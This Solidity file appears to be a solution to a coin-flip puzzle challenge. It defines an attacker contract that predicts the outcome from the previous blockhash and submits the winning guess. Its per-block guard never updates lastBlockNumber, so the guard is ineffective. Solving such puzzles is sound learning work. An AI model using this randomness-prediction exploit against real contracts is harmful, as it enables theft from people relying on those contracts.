// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {CoinFlip} from "../../puzzles/3/CoinFlip.sol";

contract CoinFlipAttacker {
    CoinFlip public immutable coinFlip;
    uint256 constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    uint256 public lastBlockNumber;

    error CanOnceExecuteOncePerBlock();

    constructor(address coinFlipAddress) {
        coinFlip = CoinFlip(coinFlipAddress);
    }

    function cheatGuess() external returns (bool) {
        if (lastBlockNumber >= block.number) {
            revert CanOnceExecuteOncePerBlock();
        }
        uint256 value = uint256(blockhash(block.number - 1)) / FACTOR;
        bool side = value == 1 ? true : false;
        return coinFlip.flip(side);
    }
}
